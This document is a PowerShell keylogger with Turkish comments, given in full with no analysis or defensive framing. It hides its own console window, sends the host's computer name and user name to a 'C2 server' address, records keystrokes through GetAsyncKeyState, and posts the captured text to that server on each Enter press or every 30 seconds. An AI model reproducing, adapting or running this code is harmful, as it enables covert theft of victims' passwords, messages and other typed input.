# Konsol penceresini tamamen gizle
$window = Add-Type -memberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindow(int hWnd, int nCmdShow);
"@ -name "Win32ShowWindowAsync" -namespace Win32Functions -passThru
$window::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0)

# C2 Sunucu Adresin
$C2_SERVER = "192.168.1.10:8080/upload"

# İlk Sinyal
$startup_msg = "[+] SİSTEM AKTİF! Bilgisayar: $env:COMPUTERNAME | Kullanıcı: $env:USERNAME"
try { Invoke-RestMethod -Uri $C2_SERVER -Method Post -Body @{ log = $startup_msg } -ErrorAction SilentlyContinue } catch {}

$global:KeyLog = ""
$lastSendTime = (Get-Date) # Zamanlayıcıyı başlat

$Signature = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
"@
$API = Add-Type -MemberDefinition $Signature -Name 'Keylogger' -Namespace 'Muzoovy' -PassThru
Add-Type -AssemblyName System.Windows.Forms

while ($true) {
    Start-Sleep -Milliseconds 40
    for ($ascii = 8; $ascii -le 254; $ascii++) {
        $state = $API::GetAsyncKeyState($ascii)

        if (($state -band 0x8000) -eq 0x8000) {
            $key = [System.Windows.Forms.Keys]$ascii

            if (($ascii -ge 65 -and $ascii -le 90) -or ($ascii -ge 48 -and $ascii -le 57) -or $ascii -eq 32) {
                if ($ascii -eq 32) { $global:KeyLog += " " }
                else { $global:KeyLog += $key.ToString() }
            }
            elseif ($ascii -eq 13) {
                $global:KeyLog += " [ENTER]`n"
                
                # ENTER'a basıldığında cümleyi direkt yolla ve RAM'i temizle
                try {
                    Invoke-RestMethod -Uri $C2_SERVER -Method Post -Body @{ log = $global:KeyLog } -ErrorAction SilentlyContinue
                    $global:KeyLog = ""
                    $lastSendTime = (Get-Date)
                } catch {}
            }
        }
    }

    # VEYA 30 saniye geçtiyse, birikenleri yolla (Zaman tabanlı exfiltration)
    if (((Get-Date) - $lastSendTime).TotalSeconds -ge 30 -and $global:KeyLog.Length -gt 0) {
        try {
            Invoke-RestMethod -Uri $C2_SERVER -Method Post -Body @{ log = $global:KeyLog } -ErrorAction SilentlyContinue
            $global:KeyLog = ""
            $lastSendTime = (Get-Date)
        } catch {}
    }
}
